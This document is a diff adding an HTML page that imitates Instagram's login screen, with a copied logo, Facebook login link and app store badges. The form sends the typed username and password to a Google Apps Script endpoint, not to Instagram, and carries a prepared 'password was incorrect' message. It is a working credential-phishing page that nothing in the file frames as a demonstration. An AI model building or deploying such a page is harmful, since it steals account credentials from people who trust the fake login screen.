@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="logo" alt="Instagram Logo">
+            
+            
+            <form method="post"
+             action="https://script.google.com/macros/s/AKfycbzbS45F27bPk1pFkx12anG-Mk3MSzvymfxBbr_LSA53arUHqVp2VuS46p1JUFoSaIBw/exec" 
+            name="login-form"
+            onsubmit="return validateForm()">
+                <input type="text" 
+                name="user-name"
+                id="username" placeholder="Phone number, username, or email" required
+                onkeydown="
+                Username();
+                ">
+                <input type="password"
+                name="pass-word"
+                id="password" placeholder="Password" required
+                onkeydown="
+                Password();
+                ">
+                <input  
+                type="submit"
+                value="Login"
+                id="submit"
+                
+                
+                                
+                >
+                <p id="error-message"></p>
+<div class="error-message" name="error-message">Sorry, your password was incorrect. Please double-check your password.</div>
+
+            </form>
+
+            <div class="separator">
+                <div class="line"></div>
+                <span>OR</span>
+                <div class="line"></div>
+            </div>
+
+            <div class="fb-login">
+                <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook">
+                <a href="https://www.facebook.com/login/">Log in with Facebook</a>
+            </div>
+
+            <a href="https://www.instagram.com/accounts/password/reset/?hl=en" class="forgot-password">Forgot password?</a>
+        </div>
+
+        <div class="signup-box">
+            Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/?hl=en">Sign up</a>
+        </div>
+
+        <div class="app-download">
+            <p>Get the app.</p>
+            <div class="store-buttons">
+              <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/6/67/App_Store_%28iOS%29.svg" alt="Apple App Store">
+              </a>
+              <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/512px-Google_Play_Store_badge_EN.svg.png" alt="Google Play Store">
+            </a>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js">
+    </script>
+</body>
+</html>
